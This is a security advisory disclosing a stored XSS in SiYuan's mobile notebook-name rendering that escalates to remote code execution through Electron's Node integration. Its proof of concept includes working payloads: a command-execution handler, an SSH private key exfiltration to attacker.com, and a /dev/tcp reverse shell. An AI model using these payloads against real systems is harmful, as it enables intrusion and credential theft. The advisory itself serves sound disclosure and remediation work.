# [M] SiYuan Vulnerable to Remote Code Execution via Stored XSS in Notebook Name - Mobile Interface

## Summary
Severity: Medium
Advisory: GHSA-qr46-rcv3-4hq3
CVE: CVE-2026-32751
CWE: CWE-79
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-qr46-rcv3-4hq3
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0

## Details
# Remote Code Execution via Stored XSS in Notebook Name - Mobile Interface

## Summary

SiYuan's mobile file tree (`MobileFiles.ts`) renders notebook names via `innerHTML` without HTML escaping when processing `renamenotebook` WebSocket events. The desktop version (`Files.ts`) properly uses `escapeHtml()` for the same operation. An authenticated user who can rename notebooks can inject arbitrary HTML/JavaScript that executes on any mobile client viewing the file tree.

Since Electron is configured with `nodeIntegration: true` and `contextIsolation: false`, the injected JavaScript has full Node.js access, escalating stored XSS to **full remote code execution**. The mobile layout is also used in the Electron desktop app when the window is narrow, making this exploitable on desktop as well.

## Affected Component

- **Vulnerable file:** `app/src/mobile/dock/MobileFiles.ts:77`
- **Safe counterpart:** `app/src/layout/dock/Files.ts:104` (uses `escapeHtml`)
- **Backend (no escaping):** `kernel/api/notebook.go:104-116` (`renameNotebook`)
- **Electron config:** `app/electron/main.js:422-426` (`nodeIntegration: true`, `contextIsolation: false`)
- **Endpoint:** `POST /api/notebook/renameNotebook` (authenticated)
- **Version:** SiYuan <= 3.5.9

## Vulnerable Code

### Mobile — no escaping (MobileFiles.ts:77)

```typescript
case "renamenotebook":
    this.element.querySelector(`[data-url="${data.data.box}"] .b3-list-item__text`).innerHTML = data.data.name;
    break;
```

### Desktop — properly escaped (Files.ts:104)

```typescript
case "renamenotebook":
    this.element.querySelector(`[data-url="${data.data.box}"] .b3-list-item__text`).innerHTML = escapeHtml(data.data.name);
    break;
```

### Backend — sends unescaped name (notebook.go:104-116)

```go
func renameNotebook(c *gin.Context) {
    // ...
    name := arg["name"].(string)
    err := model.RenameBox(notebook, name)
    // ...
    evt := util.NewCmdResult("renamenotebook", 0, util.PushModeBroadcast)
    evt.Data = map[string]interface{}{
        "box":  notebook,
        "name": name,  // Unescaped — sent directly to all clients
    }
    util.PushEvent(evt)
}
```

`model.RenameBox()` only validates length (512 chars max) and emptiness — no HTML sanitization.

### Electron — Node.js in renderer (main.js:422-426)

```javascript
webPreferences: {
    nodeIntegration: true,
    webviewTag: true,
    webSecurity: false,
    contextIsolation: false,
}
```

Any JavaScript executed via innerHTML has full access to `require('child_process')`, `require('fs')`, `require('net')`, etc.

## Proof of Concept

**Tested and confirmed on SiYuan v3.5.9 (Docker).**

### 1. Set malicious notebook name (RCE payload)

```http
POST /api/notebook/renameNotebook HTTP/1.1
Content-Type: application/json
Cookie: siyuan=<session>

{
    "notebook": "<NOTEBOOK_ID>",
    "name": "<img src=x onerror=\"require('child_process').exec('calc.exe')\">"
}
```

On Linux/macOS:
```json
{
    "notebook": "<NOTEBOOK_ID>",
    "name": "<img src=x onerror=\"require('child_process').exec('id > /tmp/pwned')\">"
}
```

**Confirmed:** API accepts the name without escaping. The `renamenotebook` WebSocket event broadcasts the raw HTML to all connected clients.

### 2. Mobile client renders and executes

When any mobile client receives the `renamenotebook` event, `MobileFiles.ts:77` sets `innerHTML = data.data.name`. The `<img>` tag's `src=x` fails to load, triggering `onerror` which calls `require('child_process').exec()` — **arbitrary OS command execution**.

### 3. Verified event content

```python
# Unauthenticated WebSocket listener receives:
{
    "cmd": "renamenotebook",
    "data": {
        "box": "20260309161535-do8qg95",
        "name": "<img src=x onerror=\"require('child_process').exec('calc.exe')\">"
    }
}
```

The HTML/JS payload is preserved verbatim in the WebSocket event.

### 4. Data exfiltration variant

```json
{
    "notebook": "<NOTEBOOK_ID>",
    "name": "<img src=x onerror=\"fetch('https://attacker.com/exfil?k='+require('fs').readFileSync(require('os').homedir()+'/.ssh/id_rsa','utf8'))\">"
}
```

### 5. Reverse shell variant

```json
{
    "notebook": "<NOTEBOOK_ID>",
    "name": "<img src=x onerror=\"require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/attacker.com/4444 0>&1\\\"')\">"
}
```

## Attack Scenario

1. In a multi-user SiYuan deployment, an attacker with editor role renames a notebook with an RCE payload
2. The `renamenotebook` event broadcasts the payload to ALL connected clients
3. Any user viewing the file tree on the mobile interface (or desktop in narrow/mobile layout) triggers the payload
4. `nodeIntegration: true` gives the injected JavaScript full OS access
5. Attacker achieves arbitrary command execution on the victim's machine

**Persistence:** The notebook name is stored in the notebook's `.siyuan/conf.json`. The payload re-triggers every time the file tree renders on mobile — it survives restarts.

**Sync vector:** If the workspace is synced (SiYuan Cloud Sync or S3), the malicious notebook name propagates to all synced devices automatically.

## Impact

- **Severity:** CRITICAL (CVSS ~9.0)
- **Type:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
- Full remote code execution on Electron desktop via `nodeIntegration: true`
- Stored XSS — notebook names persist across sessions and survive restarts
- Propagates via cloud sync to all synced devices
- Affects all mobile interface users and desktop users in mobile/narrow layout
- Inconsistent escaping — desktop is safe, mobile is not (indicates oversight)
- Can steal files, credentials, SSH keys, install backdoors, open reverse shells

## Suggested Fix

### 1. Apply the same escaping used in the desktop version

```typescript
// Before (vulnerable):
this.element.querySelector(`[data-url="${data.data.box}"] .b3-list-item__text`).innerHTML = data.data.name;

// After (fixed):
this.element.querySelector(`[data-url="${data.data.box}"] .b3-list-item__text`).innerHTML = escapeHtml(data.data.name);
```

### 2. Sanitize notebook names on the backend

```go
func RenameBox(boxID, name string) (err error) {
    name = util.EscapeHTML(name)  // Sanitize at the source
    // ...
}
```

### 3. Long-term: Harden Electron configuration

```javascript
webPreferences: {
    nodeIntegration: false,
    contextIsolation: true,
    sandbox: true,
}
```

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-qr46-rcv3-4hq3
- https://nvd.nist.gov/vuln/detail/CVE-2026-32751
- https://github.com/siyuan-note/siyuan/commit/f6d35103f774b65e52f03e018649ff0e57924fb0
- https://github.com/siyuan-note/siyuan
- https://github.com/siyuan-note/siyuan/releases/tag/v3.6.1
